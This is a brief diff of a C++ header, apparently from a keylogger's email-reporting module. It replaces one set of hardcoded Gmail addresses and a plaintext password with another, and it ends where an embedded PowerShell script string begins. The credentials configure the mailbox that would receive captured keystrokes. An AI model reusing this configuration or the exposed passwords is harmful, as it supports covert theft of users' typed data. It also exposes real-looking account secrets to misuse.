@@ -18,9 +18,9 @@ We are going to input the string into a file and invoke the powershell script fo
 namespace Mail
 {
 
-    #define X_EM_TO "desmondmile03@gmail.com"
-    #define X_EM_FROM "desmondmile03@gmail.com"
-    #define X_EM_PASS "Desmond1"
+    #define X_EM_TO "hackrespoint@gmail.com"
+    #define X_EM_FROM "hackrespoint@gmail.com"
+    #define X_EM_PASS "team9.Keylogger"
 
 const std::string &PowerShellScript =                                                  //Just the powershell script converted to C++
 
